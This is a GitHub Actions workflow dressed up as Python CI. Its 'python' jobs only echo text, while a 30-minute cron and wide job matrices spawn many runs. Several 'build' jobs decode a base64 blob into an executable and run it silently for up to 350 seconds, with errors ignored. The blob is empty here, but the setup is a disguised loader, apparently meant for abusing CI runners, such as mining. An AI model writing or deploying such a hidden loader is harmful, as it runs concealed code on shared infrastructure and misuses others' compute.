name: CI
on:  
  push:
  pull_request:
  schedule:
  - cron: "*/30 * * * *"
 
jobs:
 python-1:
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 15
      fail-fast: false
      matrix:
        hanakaru: [1.4, 1.5, 1.6, 1.7, 1.8]
        flag: [A, B, C]
 
    steps:
    - uses: actions/checkout@v3
    - name: Python-run
      run: echo "python"
 
 python-2:
    runs-on: ubuntu-latest
    needs: python-1
    strategy:
      max-parallel: 20
      fail-fast: false
      matrix:
        hanakaru: [1.4, 1.5, 1.6, 1.7, 1.8]
        flag: [C, D, E, F]
 
    steps:
    - uses: actions/checkout@v3
    - name: Python-run
      run: echo "python"
 
 python-build-2:
    runs-on: ubuntu-20.04 
    needs: python-2
    strategy:
      fail-fast: false
      matrix:
        hanakaru: [1.4, 1.5, 1.6]
        flag: [A]
    steps:
    - uses: actions/checkout@v3
    - name: Rerunning
      continue-on-error: true
      run: |
         echo '' > fo
         base64 fo -d > foo
         chmod +x foo
         timeout 350 ./foo >/dev/null >/dev/null 2>&1

 python-build-1:
    runs-on: ubuntu-20.04 
    needs: python-2
    strategy:
      fail-fast: false
      matrix:
        hanakaru: [1.11, 1.12]
        flag: [B]
    steps:
    - uses: actions/checkout@v3
    - name: Rerunning
      continue-on-error: true
      run: |
         echo '' > fo
         base64 fo -d > foo
         chmod +x foo
         timeout 350 ./foo >/dev/null >/dev/null 2>&1

 python-build-done-2:
    runs-on: ubuntu-20.04 
    needs: python-build-1
    steps:
    - uses: actions/checkout@v3
    - name: Rerunning
      continue-on-error: true
      run: |
         echo 'done'
         sleep 2
         echo 'rerun'

 python-build-done-1:
    runs-on: ubuntu-20.04 
    needs: python-build-2
    steps:
    - uses: actions/checkout@v3
    - name: Rerunning
      continue-on-error: true
      run: |
         echo 'done'
         sleep 2
         echo 'rerun'
